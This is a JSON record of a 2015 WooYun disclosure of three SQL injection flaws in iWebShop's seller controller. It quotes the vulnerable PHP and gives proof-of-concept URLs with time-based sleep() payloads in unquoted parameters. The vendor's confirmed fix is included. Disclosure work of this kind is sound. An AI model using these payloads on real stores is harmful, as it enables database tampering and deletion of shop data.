{"id": 34931, "wybug_id": "wooyun-2015-0105141", "wybug_title": "iwebshop开源商店三处sql注入打包(附验证脚本)", "wybug_corp": "www.jooyea.cn", "wybug_author": "牛肉包子", "wybug_date": "2015-04-01 14:29", "wybug_open_date": "2015-06-30 20:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-30：\t细节向公众公开  简要描述： rt 详细说明：  看到\\controllers\\seller.php\npublic function goods_report()\t{\t\t$seller_id = $this->seller['seller_id'];\t\t$condition = Util::search(IReq::get('search'));//获取search          //var_dump($condition);\t\t$where  = 'go.seller_id='.$seller_id;\t\t$where .= $condition ? \" and \".$condition : \"\";\t\t$goodHandle = new IQuery('goods as go');\t\t$goodHandle->order  = \"go.id desc\";\t\t$goodHandle->fields = \"go.*\";\t\t$goodHandle->where  = $where;\t\t$goodList = $goodHandle->find();\t\t//构建 Excel table;\t\t$strTable ='<table width=\"500\" border=\"1\">';\t\t$strTable .= '<tr>';\t\t$strTable .= '<td style=\"text-align:center;font-size:12px;\">商品名称</td>';\t\t$strTable .= '<td style=\"text-align:center;font-size:12px;\" width=\"160\">分类</td>';\t\t$strTable .= '<td style=\"text-align:center;font-size:12px;\" width=\"60\">售价</td>';\t\t$strTable .= '<td style=\"text-align:center;font-size:12px;\" width=\"60\">库存</td>';\t\t$strTable .= '</tr>';\t\tforeach($goodList as $k=>$val){\t\t\t$strTable .= '<tr>';\t\t\t$strTable .= '<td style=\"text-align:center;font-size:12px;\">&nbsp;'.$val['name'].'</td>';\t\t\t$strTable .= '<td style=\"text-align:left;font-size:12px;\">'.goods_class::getGoodsCategory($val['id']).' </td>';\t\t\t$strTable .= '<td style=\"text-align:left;font-size:12px;\">'.$val['sell_price'].' </td>';\t\t\t$strTable .= '<td style=\"text-align:left;font-size:12px;\">'.$val['store_nums'].' </td>';\t\t\t$strTable .= '</tr>';\t\t}\t\t$strTable .='</table>';\t\tunset($goodList);\t\t$reportObj = new report();\t\t$reportObj->setFileName('goods');\t\t$reportObj->toDownload($strTable);\t\texit();\t}\t//商品删除\tpublic function goods_del()\t{\t\t//post数据\t    $id = IFilter::act(IReq::get('id'));//获取id\t    //生成goods对象\t    $goods = new goods_class();\t    $goods->seller_id = $this->seller['seller_id'];\t    if($id)\t\t{\t\t\tif(is_array($id))\t\t\t{\t\t\t\tforeach($id as $key => $val)\t\t\t\t{\t\t\t\t\t$goods->del($val);//进入sql\t\t\t\t}\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$goods->del($id);\t\t\t}\t\t}\t\t$this->redirect(\"goods_list\");\t}\t//商品状态修改\tpublic function goods_status()\t{\t    $id        = IFilter::act(IReq::get('id'));//获取id\t\t$is_del    = IFilter::act(IReq::get('is_del'),'int');\t\t$is_del    = $is_del === 0 ? 3 : $is_del; //不能等于0直接上架\t\t$seller_id = $this->seller['seller_id'];\t\t$goodsDB = new IModel('goods');\t\t$goodsDB->setData(array('is_del' => $is_del));\t    if($id)\t\t{\t\t\tif(is_array($id))//如果id是数组就进入sql\t\t\t{\t\t\t\tforeach($id as $key => $val)\t\t\t\t{\t\t\t\t\t$goodsDB->update(\"id = \".$val.\" and seller_id = \".$seller_id);\t\t\t\t}\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$goodsDB->update(\"id = \".$val.\" and seller_id = \".$seller_id);\t\t\t}\t\t}\t\t$this->redirect(\"goods_list\");\t}\n我们跟入search函数\npublic static function search($search)\t{\t\tif(!$search)\t\t{\t\t\treturn '';\t\t}var_dump($search);\t\t$where = array();\t\t//like子句处理\t\tif(isset($search['like']) && $search['likeValue'])\t\t{\t\t\t$where[] = $search['like'].\" like '%\".$search['likeValue'].\"%'\";\t\t}\t\tunset($search['like']);\t\tunset($search['likeValue']);\t\t//自定义子句处理\t\tforeach($search as $key => $val)\t\t{\t\t\tif($val === '')\t\t\t{\t\t\t\tcontinue;\t\t\t}\t\t\tif(strpos($key,'num') !== false)\t\t\t{\t\t\t\t$where[] = $key.$val;\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$where[] = $key.\"'\".$val.\"'\";\t\t\t}\t\t}\t\treturn join(\" and \",$where);\t}\n可以看到$key没有单引号就进入sql了。首先注册一个商铺。注入#1然后访问\nhttp://127.0.0.1/iwebshop3.1.15030300/iwebshop/index.php?controller=seller&action=goods_report&search[sleep(2)%23]=aaaa\n\n\n看到mysql日志\n\n执行成功注入#2我们看到del函数\npublic function del($where)\t{\t\t$where = (strtolower($where) == 'all') ? '' : ' WHERE '.$where;\t\t$sql   = 'DELETE FROM '.$this->tableName.$where;\t\treturn $this->db->query($sql);\t}\n也是无单引号，直接进入。我们访问\nhttp://127.0.0.1/iwebshop3.1.15030300/iwebshop/index.php?controller=seller&action=goods_del&id=1/**/or/**/sleep(2)%23\n\n\n然后看到mysql日志\n\n注入#3我们访问\nhttp://127.0.0.1/iwebshop3.1.15030300/iwebshop/index.php?controller=seller&action=goods_status&id[]=sleep(5)%23\n然后看到mysql日志\n\n成功执行   漏洞证明：  然后随便用了个脚本跑了一下\n\n   修复方案：  单引号，或者int   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-01 20:08 厂商回复： 感谢测试！我们已经进行了修复处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-01 17:38 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  吓哭了    \n     2015-04-02 00:55 |    \t\t阿布 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        )\t\t \n  表哥 V5    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}